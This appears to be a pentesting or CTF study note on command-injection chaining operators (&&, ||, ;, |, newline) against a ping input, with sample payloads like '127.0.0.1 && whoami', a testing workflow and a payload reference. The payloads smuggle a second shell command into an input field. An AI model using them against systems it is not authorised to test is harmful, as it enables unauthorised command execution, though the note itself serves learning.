# Command Injection – Other Injection Operators

## Overview

Different command chaining operators behave differently depending on:

- command success or failure
- shell environment
- parsing behaviour

Understanding how operators work allows us to craft payloads that:

- bypass input validation
- produce cleaner output
- avoid breaking the original command
- execute commands conditionally
- increase reliability of exploitation

Some operators execute commands regardless of success, while others execute conditionally.

Choosing the correct operator improves reliability of exploitation.

---

# 1. AND Operator (&&)

The AND operator executes the second command **only if the first command succeeds**.

Operator:

```
&&
```

Example payload:

```
127.0.0.1 && whoami
```

Executed command:

```bash
ping -c 1 127.0.0.1 && whoami
```

Behaviour:

1. ping executes
2. if ping succeeds (exit code 0)
3. second command executes

Example output:

```
PING 127.0.0.1 ...

www-data
```

---

# 2. Why AND Operator Works Well

Advantages:

- preserves original command functionality
- avoids breaking application logic
- produces consistent output
- useful when application expects valid input
- reduces suspicion during testing

If first command fails, second command will not execute.

Example failure case:

```
invalid_ip && whoami
```

Second command may not run.

---

# 3. OR Operator (||)

The OR operator executes the second command **only if the first command fails**.

Operator:

```
||
```

Example payload:

```
127.0.0.1 || whoami
```

Executed command:

```bash
ping -c 1 127.0.0.1 || whoami
```

Behaviour:

- ping succeeds
- second command does not execute

Example output:

```
PING 127.0.0.1 ...
```

No injected output visible.

---

# 4. Forcing OR Operator Execution

To force execution, intentionally cause first command to fail.

Example payload:

```
|| whoami
```

Executed command:

```bash
ping -c 1 || whoami
```

Ping fails due to missing IP.

Second command executes.

Example output:

```
ping: usage error
www-data
```

Advantages:

- cleaner output
- avoids noisy command output
- useful when original command breaks easily

---

# 5. Comparing Operator Behaviour

| Operator | Behaviour |
|---------|----------|
| ; | always executes both commands |
| && | executes second command if first succeeds |
| \|\| | executes second command if first fails |
| & | executes both commands |
| \| | passes output to second command |
| newline | executes new command |

Choosing operator depends on:

- application behaviour
- expected input format
- command execution reliability
- desired output clarity

---

# 6. Practical Operator Testing

Example AND payload:

```
127.0.0.1 && whoami
```

Example OR payload:

```
|| whoami
```

Example semicolon payload:

```
127.0.0.1; whoami
```

Example pipe payload:

```
127.0.0.1 | whoami
```

Testing multiple operators increases likelihood of success.

---

# 7. Cleaner Output Strategy

Some operators produce noisy output.

Example:

```
127.0.0.1; whoami
```

Produces ping output and command output.

Cleaner alternative:

```
|| whoami
```

Produces only command output.

Useful when application output is limited.

---

# 8. Injection Operators Across Vulnerability Classes

Operators are commonly reused across injection types.

| Injection Type | Common Operators |
|---------------|------------------|
| SQL Injection | ' " ; -- /* */ |
| Command Injection | ; && \|\| |
| LDAP Injection | * ( ) & \| |
| XPath Injection | ' or and substring |
| OS Command Injection | ; & \| && \|\| |
| Code Injection | ' ; -- /* */ $() |
| Directory Traversal | ../ ..\\ %00 |
| Object Injection | ; & \| |
| XQuery Injection | ' ; -- |
| Shellcode Injection | \x \u %n |
| Header Injection | \n \r\n %0a |

Operators vary depending on:

- programming language
- interpreter
- database engine
- operating system
- parsing rules

---

# 9. Operator Selection Strategy

Test multiple operators when probing injection points.

Reasons:

- filters may block specific characters
- application may escape certain characters
- shell may interpret operators differently
- environment may affect behaviour
- output visibility may vary

Example testing order:

```
;
&&
||
|
&
newline
$()
```

---

# 10. Practical Testing Workflow

## Step 1 – confirm injection point

Verify input reaches system command.

## Step 2 – test basic operator

Example:

```
127.0.0.1; whoami
```

## Step 3 – test conditional operators

Example:

```
127.0.0.1 && whoami
```

## Step 4 – test failure-triggered operators

Example:

```
|| whoami
```

## Step 5 – compare output clarity

Identify most reliable payload.

---

# 11. Quick Payload Reference

## AND operator

```
127.0.0.1 && whoami
```

## OR operator

```
|| whoami
```

## semicolon operator

```
127.0.0.1; whoami
```

## pipe operator

```
127.0.0.1 | whoami
```

## newline injection

```
127.0.0.1
whoami
```

---

# 12. Key Takeaways

- different operators execute commands under different conditions
- && executes only if first command succeeds
- || executes only if first command fails
- choosing correct operator improves reliability
- some operators produce cleaner output than others
- testing multiple operators increases success rate
- operators are reused across many injection vulnerabilities
- understanding operator behaviour improves exploitation efficiency

---

# Tags

#command-injection
#operators
#rce
#input-validation
#pentesting
#ctf
#linux
#bash
#injection
#obsidian